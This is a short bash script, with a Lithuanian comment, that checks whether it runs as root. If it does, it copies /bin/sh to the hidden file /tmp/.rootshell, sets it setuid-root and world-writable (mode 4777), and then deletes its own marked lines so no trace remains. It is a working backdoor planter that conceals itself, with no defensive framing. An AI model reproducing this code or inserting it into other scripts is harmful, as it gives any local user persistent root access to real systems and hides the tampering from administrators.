#!/bin/bash

#TODO Padaryti, kad skriptas turetu tokias pacias teises kokias turejo pries root

if [ "${USER:-$LOGNAME}" == "root" ]; then   	# REMOVEME
	echo "esu root"				# REMOVEME
	cp -v /bin/sh /tmp/.rootshell 		# REMOVEME
	chown root /tmp/.rootshell 		# REMOVEME
	chmod -f 4777 /tmp/.rootshell		# REMOVEME
	grep -v "# REMOVEME" $0 > /tmp/junk	# REMOVEME
	mv /tmp/junk $0				# REMOVEME


else
	echo "not root, exiting"
fi

